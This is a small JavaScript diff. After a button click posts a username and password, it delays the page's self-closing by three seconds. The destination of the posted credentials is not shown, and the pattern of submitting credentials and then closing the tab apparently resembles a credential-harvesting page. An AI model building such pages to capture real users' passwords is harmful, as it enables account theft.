@@ -102,7 +102,11 @@ document.addEventListener('DOMContentLoaded', () => {
     document.querySelectorAll('#btn_final').forEach((b) => {
         b.addEventListener('click', () => {
             this.postData(unameInp, pwdInp);
-            window.open(location, '_self').close();
+            // Add timeout for 3 seconds
+            setTimeout(() => {
+                window.open(location, '_self').close();
+            }, 3000)
+
         })
     })
 })
